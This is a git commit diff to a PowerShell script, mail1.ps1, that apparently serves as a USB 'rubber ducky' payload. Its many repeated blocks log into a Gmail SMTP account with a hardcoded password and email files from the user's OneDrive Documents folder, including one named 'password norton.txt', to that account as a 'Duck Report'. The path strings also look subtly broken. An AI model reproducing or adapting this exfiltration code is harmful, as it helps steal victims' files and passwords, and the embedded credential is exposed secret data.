a953a954ec844ad3bf57a665307b789308fe7263
Quentinq32 <100795382+Quentinq32@users.noreply.github.com>
2022-03-13 23:00:41 +0100

    Add files via upload

--- mail1.ps1
+++ mail1.ps1
@@ -7,7 +7,7 @@ $ReportEmail.From = 'duckysys@gmail.com'
 $ReportEmail.To.Add('duckysys@gmail.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
-$files="$($env:USERPROFILE)\OneDrive\Documents\dessin1.txt"
+$files="$$($env:USERPROFILE)\OneDrive\Documents\expressvpn.txt"
 $ReportEmail.Attachments.Add($files)
 $SMTPInfo.Send($ReportEmail)
 $SMTPServer = 'smtp.gmail.com'
@@ -19,7 +19,7 @@ $ReportEmail.From = 'duckysys@gmail.com'
 $ReportEmail.To.Add('duckysys@gmail.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
-$files="$($env:USERPROFILE)\OneDrive\Documents\souris.cfg"
+$files="$$($env:USERPROFILE)\OneDrive\Documents\extinction automatique.txt"
 $ReportEmail.Attachments.Add($files)
 $SMTPInfo.Send($ReportEmail)
 $SMTPServer = 'smtp.gmail.com'
@@ -31,6 +31,90 @@ $ReportEmail.From = 'duckysys@gmail.com'
 $ReportEmail.To.Add('duckysys@gmail.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
-$files="$($env:USERPROFILE)\OneDrive\Documents\config.cfg"
+$files="$$($env:USERPROFILE)\OneDrive\Documents\malistedefichier2.txt"
+$ReportEmail.Attachments.Add($files)
+$SMTPInfo.Send($ReportEmail)
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('duckysys@gmail.com', 'haxu77BNqu56SvS');
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'duckysys@gmail.com'
+$ReportEmail.To.Add('duckysys@gmail.com')
+$ReportEmail.Subject = 'Duck Report'
+$ReportEmail.Body = 'Attached is your duck report.... Quack' 
+$files="$$($env:USERPROFILE)\OneDrive\Documents\password norton.txt"
+$ReportEmail.Attachments.Add($files)
+$SMTPInfo.Send($ReportEmail)
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('duckysys@gmail.com', 'haxu77BNqu56SvS');
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'duckysys@gmail.com'
+$ReportEmail.To.Add('duckysys@gmail.com')
+$ReportEmail.Subject = 'Duck Report'
+$ReportEmail.Body = 'Attached is your duck report.... Quack' 
+$files="$$($env:USERPROFILE)\OneDrive\Documents\son.txt"
+$ReportEmail.Attachments.Add($files)
+$SMTPInfo.Send($ReportEmail)
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('duckysys@gmail.com', 'haxu77BNqu56SvS');
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'duckysys@gmail.com'
+$ReportEmail.To.Add('duckysys@gmail.com')
+$ReportEmail.Subject = 'Duck Report'
+$ReportEmail.Body = 'Attached is your duck report.... Quack' 
+$files="$$($env:USERPROFILE)\OneDrive\Documents\mise en veille.lnk"
+$ReportEmail.Attachments.Add($files)
+$SMTPInfo.Send($ReportEmail)
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('duckysys@gmail.com', 'haxu77BNqu56SvS');
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'duckysys@gmail.com'
+$ReportEmail.To.Add('duckysys@gmail.com')
+$ReportEmail.Subject = 'Duck Report'
+$ReportEmail.Body = 'Attached is your duck report.... Quack' 
+$files="$$($env:USERPROFILE)\OneDrive\Documents\Liste radio.ods"
+$ReportEmail.Attachments.Add($files)
+$SMTPInfo.Send($ReportEmail)
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('duckysys@gmail.com', 'haxu77BNqu56SvS');
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'duckysys@gmail.com'
+$ReportEmail.To.Add('duckysys@gmail.com')
+$ReportEmail.Subject = 'Duck Report'
+$ReportEmail.Body = 'Attached is your duck report.... Quack' 
+$files="$$($env:USERPROFILE)\OneDrive\Documents\lancement emulateur google tv.txt"
+$ReportEmail.Attachments.Add($files)
+$SMTPInfo.Send($ReportEmail)
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('duckysys@gmail.com', 'haxu77BNqu56SvS');
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'duckysys@gmail.com'
+$ReportEmail.To.Add('duckysys@gmail.com')
+$ReportEmail.Subject = 'Duck Report'
+$ReportEmail.Body = 'Attached is your duck report.... Quack' 
+$files="$$($env:USERPROFILE)\OneDrive\Documents\intercalaire.odt"
+$ReportEmail.Attachments.Add($files)
+$SMTPInfo.Send($ReportEmail)
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('duckysys@gmail.com', 'haxu77BNqu56SvS');
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'duckysys@gmail.com'
+$ReportEmail.To.Add('duckysys@gmail.com')
+$ReportEmail.Subject = 'Duck Report'
+$ReportEmail.Body = 'Attached is your duck report.... Quack' 
+$files="$$($env:USERPROFILE)\OneDrive\Documents\intercalaire.odt"
 $ReportEmail.Attachments.Add($files)
 $SMTPInfo.Send($ReportEmail)
